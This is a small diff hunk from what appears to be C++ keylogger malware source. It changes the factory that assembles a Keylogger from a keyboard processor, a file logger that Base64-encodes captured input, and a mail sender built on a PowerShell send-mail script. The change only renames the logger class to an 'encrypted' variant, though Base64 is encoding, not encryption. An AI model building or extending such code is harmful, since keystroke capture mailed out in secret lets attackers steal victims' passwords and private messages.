@@ -15,6 +15,6 @@ std::unique_ptr<Keylogger> KeyloggerFactory::createKeylogger()
         std::make_unique<mail::PowerShellSendMailScriptCreator>(fileSystem));
     return std::make_unique<Keylogger>(
         std::move(mailSender), std::make_unique<KeyboardProcessor>(),
-        std::make_unique<UserInputFileLogger>(fileSystem, std::make_unique<Base64Encryptor>()));
+        std::make_unique<UserInputEncryptedFileLogger>(fileSystem, std::make_unique<Base64Encryptor>()));
 }
 }
